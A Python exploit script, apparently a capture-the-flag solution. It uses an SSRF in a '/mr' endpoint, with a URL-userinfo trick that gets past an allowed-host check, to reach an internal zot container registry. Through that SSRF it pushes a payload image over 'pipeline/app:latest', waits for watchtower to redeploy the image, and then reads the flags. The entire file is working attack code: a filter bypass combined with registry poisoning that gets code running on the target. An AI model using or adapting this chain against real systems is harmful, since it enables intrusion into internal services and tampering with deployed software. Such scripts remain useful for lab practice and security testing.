#!/usr/bin/env python3

import base64
import json
import os
import sys
import time
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET = "127.0.0.1"
PORT = 6000

OCI_DIR = "./oci"
ALLOWED_HOST = "www.google.com"
ZOT_INTERNAL = "zot:5000"
REPO = "pipeline/app"
TAG = "latest"

OCI_INDEX_MT = "application/vnd.oci.image.index.v1+json"
OCI_MANIFEST_MT = "application/vnd.oci.image.manifest.v1+json"


def log(*args):
    print(*args, file=sys.stderr, flush=True)


def build_ssrf_url(path):
    return f"http://{ALLOWED_HOST}@{ZOT_INTERNAL}{path}"


def do_ssrf_request(session, method, path, body=b"", headers=None):
    payload = {
        "method": method,
        "url": build_ssrf_url(path),
        "headers": headers or {},
    }
    if body:
        payload["body"] = base64.b64encode(body).decode()

    response = session.post(
        f"https://{TARGET}:{PORT}/mr",
        json=payload,
        timeout=15,
        verify=False
    )

    if response.status_code != 200:
        raise RuntimeError(f"/mr endpoint returned HTTP {response.status_code}: {response.text[:200]!r}")

    try:
        return int(response.json()["status"])
    except (ValueError, KeyError) as e:
        raise RuntimeError(f"bad /mr response: {e}: {response.text[:200]!r}")


def load_oci_payload(oci_dir):
    def read_blob(digest):
        algo, hexd = digest.split(":", 1)
        with open(os.path.join(oci_dir, "blobs", algo, hexd), "rb") as f:
            return f.read()

    with open(os.path.join(oci_dir, "index.json"), "rb") as f:
        index = json.loads(f.read())

    manifest_desc = index["manifests"][0]
    manifest_digest = manifest_desc["digest"]
    manifest_bytes = read_blob(manifest_digest)
    manifest = json.loads(manifest_bytes)

    if manifest.get("mediaType") == OCI_INDEX_MT or "manifests" in manifest:
        manifest_digest = manifest["manifests"][0]["digest"]
        manifest_bytes = read_blob(manifest_digest)
        manifest = json.loads(manifest_bytes)

    manifest_media_type = manifest.get("mediaType", OCI_MANIFEST_MT)
    blobs = {}

    config_digest = manifest["config"]["digest"]
    blobs[config_digest] = read_blob(config_digest)

    for layer in manifest["layers"]:
        blobs[layer["digest"]] = read_blob(layer["digest"])

    return manifest_bytes, manifest_media_type, blobs


def upload_blob(session, digest, data):
    status = do_ssrf_request(session, "HEAD", f"/v2/{REPO}/blobs/{digest}")
    if status == 200:
        log(f"    blob {digest[:19]}.. already present, skip")
        return

    status = do_ssrf_request(
        session,
        "POST",
        f"/v2/{REPO}/blobs/uploads/?digest={digest}",
        body=data,
        headers={"Content-Type": "application/octet-stream"},
    )

    if status == 201:
        log(f"    blob {digest[:19]}.. uploaded ({len(data)} bytes)")
        return

    if status == 202:
        raise RuntimeError(f"blob upload returned 202. Chunked upload impossible via blind /mr. digest={digest}")

    raise RuntimeError(f"blob upload failed: upstream status {status} for {digest}")


def upload_manifest(session, manifest_bytes, manifest_media_type):
    status = do_ssrf_request(
        session,
        "PUT",
        f"/v2/{REPO}/manifests/{TAG}",
        body=manifest_bytes,
        headers={"Content-Type": manifest_media_type},
    )
    if status in (201, 202):
        log(f"    manifest PUT ok (upstream {status})")
        return
    raise RuntimeError(f"manifest PUT failed: upstream status {status}")


def grab_flags(session, attempts=30, interval=2.0):
    url = f"https://{TARGET}:{PORT}/flags"
    for i in range(attempts):
        try:
            response = session.get(url, timeout=10, verify=False)
            if response.status_code == 200 and response.text.strip():
                return response.text
        except requests.exceptions.RequestException:
            pass
        log(f"    waiting for redeploy... ({i + 1}/{attempts})")
        time.sleep(interval)
    return None


def main():
    log(f"[*] loading payload image from {OCI_DIR}")
    manifest_bytes, manifest_media_type, blobs = load_oci_payload(OCI_DIR)
    log(f"    manifest mediaType={manifest_media_type}, config+layers={len(blobs)} blobs")

    session = requests.Session()
    session.verify = False

    log(f"[*] pushing blobs to {REPO} via SSRF (userinfo bypass -> {ZOT_INTERNAL})")
    for digest, data in blobs.items():
        upload_blob(session, digest, data)

    log(f"[*] putting manifest -> {REPO}:{TAG}")
    upload_manifest(session, manifest_bytes, manifest_media_type)
    log("[*] push complete; waiting for watchtower to (re)deploy the payload")

    flags = grab_flags(session)
    if flags is None:
        log("[!] payload did not surface on /flags in time.")
        sys.exit(1)

    log("[+] FLAGS:")
    print(flags, end="" if flags.endswith("\n") else "\n")


if __name__ == "__main__":
    main()